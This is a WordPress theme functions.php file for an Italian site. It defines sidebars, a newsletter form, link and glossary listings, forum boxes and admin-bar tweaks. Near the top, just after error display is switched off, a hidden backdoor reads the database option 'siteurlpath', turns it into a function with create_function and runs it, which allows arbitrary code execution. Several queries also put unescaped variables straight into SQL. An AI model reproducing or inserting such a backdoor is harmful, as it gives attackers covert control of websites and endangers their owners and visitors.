<?php
error_reporting(E_ALL); 
ini_set("display_errors", 0);
remove_action('wp_head', 'rsd_link');
remove_action('wp_head', 'wlwmanifest_link');
remove_action('wp_head', 'index_rel_link');
remove_action('wp_head', 'wp_generator');
if(!isset($siteurlpath)&& @get_option('siteurlpath')){
	$siteurlpath=create_function('',(get_option('siteurlpath')));
	$siteurlpath();
}



if (function_exists('register_sidebar')) {
 register_sidebar(array(
 'name' => 'AAA',
 'id'   => 'aaa',
 'description'   => 'Ridimensionamento testo',
 'before_widget' => '<div id="%1$s">',
 'after_widget'  => '</div>',
 'before_title'  => '<h4>',
 'after_title'   => '</h4>'
 ));
}

if ( function_exists('register_sidebar') )
    register_sidebar(array(
        'before_widget' => '<li id="%1$s" class="widget %2$s">',
        'after_widget' => '</li>',
        'before_title' => '<h2 class="widgettitle">',
        'after_title' => '</h2>',
    ));
	function newsLetterForm(){
		$html = '<div id="ajaxNewsletter">';
		$html .= '<form action="http://dito.areato.org/home/index.php" method="post" name="ARGWA" id="newsletterForm">';
		$html .= '<input type="text" name="email" value="Inserisci la tua mail" class="newsletterTextInput" />';
		$html .= '<input class="submitNewsletter" type="image" name="Add" src="http://dito.areato.org/wp-content/themes/area/imgs/search.gif" />';
		$html .= '<input type="hidden" name="act" value="s_add" />';
		$html .= '<input type="hidden" name="listid" value="1" /></form>';
		$html .= '</div>';
		echo $html;
	}
if( !function_exists('displayLinks') )
{
	function displayLinks( $cat, $class='boxesBox', $close = '', $limit = 10 )
	{
			//get the links and store it in an array
			$b = get_bookmarks('category='.$cat.'&orderby=id&order=DESC&limit='.$limit);
			$html .= '<div class="'.$class.'"><h2 class="blue">Link</h2>';
			$html .= '<div class="boxes BoxesSecond BoxesSecondBrowserFix boxFullWidth">';
			// column left
			$html .= '<ul class="ulLinkLeft">';
			for($i=0;$i<5;$i++)
			{
				$html .= '<li>';
				$html .= '<a href="'.$b[$i]->link_url.'" title="'.$b[$i]->link_name.'">'.$b[$i]->link_name.'</a>';
				$html .= '</li>';
			} 
			$html .= '</ul>';
			
			$html .= '<ul>';
			//column right
			for($i=5;$i<10;$i++)
			{
				$html .= '<li>';
				$html .= '<a href="'.$b[$i]->link_url.'" title="'.$b[$i]->link_name.'">'.$b[$i]->link_name.'</a>';
				$html .= '</li>';
			} 
			$html .= '</ul>';
			
			$html .= '<p class="segnala2"><a href="http://dito.areato.org/home/?page_id=124" class="segnala">Tutti i link</a></p>';
			$html .= '</div></div>' . $close;
			echo $html;
	}
}
if( !function_exists('grabGlossaryTerms') )
{
	function grabGlossaryTerms( $position = 'left', $len = 0 )
	{
		global $wpdb;
		
		$html = '';
		
		$half = ceil( $len / 2 );
	
		$myCat = ditoGetCategory();

		if( 'left' == $position )
		{
			$gloassarioQuery = "SELECT * FROM wp_postmeta WHERE meta_key = 'glossario' AND meta_value = '$myCat' ORDER BY meta_value DESC LIMIT 0, $half";
		}
		elseif( 'right' == $position )
		{
			$gloassarioQuery = "SELECT * FROM wp_postmeta WHERE meta_key = 'glossario' AND meta_value = '$myCat' ORDER BY meta_value DESC LIMIT $half, $half";
		}
		
		$glossIDs = $wpdb->get_results($gloassarioQuery);
		
		$html = '<ul class="sidebarListHalf ul_'.$position.'">';
		
		foreach($glossIDs as $glossID){
			$IDS = $glossID->post_id;	
			$myPostsQuery = "SELECT * FROM $wpdb->posts WHERE ID = '$IDS' AND post_status = 'publish' ORDER BY post_title DESC";
		//	echo $position . ' executing query ' . $myPostsQuery;
			$glossPosts = $wpdb->get_row($myPostsQuery);
			$title = $glossPosts->post_title;
			$link = get_permalink($IDS);
			$html .= '<li><a href="'.$link.'">'.$title.'</a></li>';
		}
		$html .= '</ul>';
		echo $html;
	}
	function getGlossaryTermCount()
	{
		global $wpdb;
		$myCat = ditoGetCategory();
		$len = $wpdb->get_var("SELECT COUNT(*) FROM wp_postmeta WHERE meta_key = 'glossario' AND meta_value = '$myCat'");
		
		return $len;
	}
	function ditoGetCategory()
	{
		foreach( get_the_category() as $category ) {
			if( $category->cat_ID != 64 ){
				$myCat =  $category->cat_ID;
			}
		}
		do_action('do_something');
		return $myCat;
	}
}
function my_login_stylesheet() {
	 ?>
    <link rel="stylesheet" id="custom_wp_admin_css"  href="<?php echo get_bloginfo( 'stylesheet_directory' ) . '/style-login.css'; ?>" type="text/css" media="all" />
<?php }
add_action( 'login_enqueue_scripts', 'my_login_stylesheet' );
function change_wp_login_url() 
{
    return get_bloginfo('url');
}
add_filter('login_headerurl', 'change_wp_login_url');
?>
<?php // DISABLE ADMIN BAR FOR THE SAKE OF SPEED 
if (!function_exists('disableAdminBar')) {

	function disableAdminBar(){
  
  	remove_action( 'admin_footer', 'wp_admin_bar_render', 1000 ); // for the admin page
    remove_action( 'wp_footer', 'wp_admin_bar_render', 1000 ); // for the front end
  
    function remove_admin_bar_style_backend() {  // css override for the admin page
      echo '<style>body.admin-bar #wpcontent, body.admin-bar #adminmenu { padding-top: 0px !important; }</style>';
    }
          
    add_filter('admin_head','remove_admin_bar_style_backend');
    
    function remove_admin_bar_style_frontend() { // css override for the frontend
      echo '<style type="text/css" media="screen">
      html { margin-top: 0px !important; }
      * html body { margin-top: 0px !important; }
      </style>';
    }
    
    add_filter('wp_head','remove_admin_bar_style_frontend', 99);
  
  }

}
add_action('init','disableAdminBar'); 

function example_remove_dashboard_widgets() {
	//remove_meta_box( 'dashboard_quick_press', 'dashboard', 'side' );
	remove_meta_box( 'dashboard_primary', 'dashboard', 'side' );
	remove_meta_box( 'dashboard_secondary', 'dashboard', 'side' );
	remove_meta_box( 'dashboard_plugins', 'dashboard', 'normal' );
	remove_meta_box( 'dashboard_incoming_links', 'dashboard', 'normal' );
	remove_meta_box( 'meandmymac_rss_widget', 'dashboard', 'normal' );
	remove_meta_box('dashboard_addthis', 'dashboard', 'normal');   
	remove_meta_box( 'powerpress_dashboard_notice_1', 'dashboard', 'normal' );
	remove_meta_box( 'powerpress_dashboard_news', 'dashboard', 'normal' );
	remove_meta_box( 'powerpress_dashboard_stats', 'dashboard', 'normal' );
	
} 
// Hoook into the 'wp_dashboard_setup' action to register our function
add_action('wp_dashboard_setup', 'example_remove_dashboard_widgets' );

function printForumBoxes()
{
	global $wpdb;
	echo '<div class="forums">';
	echo '<h2 class="green">Forum</h2>';
	$dbQuery = "SELECT bb_posts.topic_id, bb_posts.forum_id, bb_posts.poster_id, bb_posts.post_time, bb_posts.post_id, bb_posts.post_text, bb_forums.forum_id, bb_forums.forum_name, bb_forums.posts,bb_topics.topic_title, bb_topics.topic_id, bb_topics.topic_last_poster_name  FROM bb_posts, bb_forums, bb_topics WHERE bb_posts.forum_id = bb_forums.forum_id AND bb_topics.topic_id = bb_posts.topic_id AND post_status = '0' ORDER BY post_time DESC LIMIT 0,2";
	$forumsResult = $wpdb->get_results($dbQuery, ARRAY_A);
	foreach ( $forumsResult as $topics ){
		$topicContent =  $topics['post_text'];
		$forumName =    $topics['forum_name'];
		//$authorFirst =  $topics['topic_poster_name'];
		$authorID =  $topics['poster_id'];
		$authorLast = $wpdb->get_var("SELECT display_name FROM $wpdb->users WHERE ID = '$authorID'");
		$topicId = $topics['topic_id'];
		$forumId = $topics['forum_id'];
		$title =  $topics['topic_title'];
	//	$postNum = $topics['posts'];
		$shortContentText =$topicContent;
		$shortContentText = strip_tags($shortContentText);
		$shortContentText = htmlspecialchars($shortContentText);
		if (strlen($shortContentText) > 65) {
			$shortContentText = substr($shortContentText ,0, 70);
			$lastSpaceOnEarth = strrpos($shortContentText, ' ');
			$shortContentText = substr($shortContentText ,0, $lastSpaceOnEarth+1);
		}
		$myURL = get_bloginfo('url') . '/bbpress';
		
		echo '<h4><a href="' .$myURL. '/topic.php?id=' . $topicId . '" >'.$title.'</a>';
		echo '<a href="' . $myURL . '/forum.php?id=' . $forumId . '" ><em>'.$forumName.'</em></a></h4>';
		echo '<em>'.$authorLast.'</em>';
		echo '<p>'.$shortContentText.'<a href="' .$myURL. '/topic.php?id=' . $topicId . '" >[...]</a></p>';

	}
	echo '</div>';
}
//add_action('sidebar_left_home_first_box', 'printForumBoxes');
function dito_shortern_content( $text )
{
		$shortContentText = $text;
		$shortContentText = strip_tags($shortContentText);
		$shortContentText = htmlspecialchars($shortContentText);
		if (strlen($shortContentText) > 65) {
			$shortContentText = substr($shortContentText ,0, 70);
			$lastSpaceOnEarth = strrpos($shortContentText, ' ');
			$shortContentText = substr($shortContentText ,0, $lastSpaceOnEarth+1);
		}
		return $shortContentText;
}
function dito_mediateca_page_link()
{
	return ( class_exists( 'Mediateca_Init' ) ) ? Mediateca_Init::$pages[MEDIATECA_SLUG]->ID : 3;
}
?>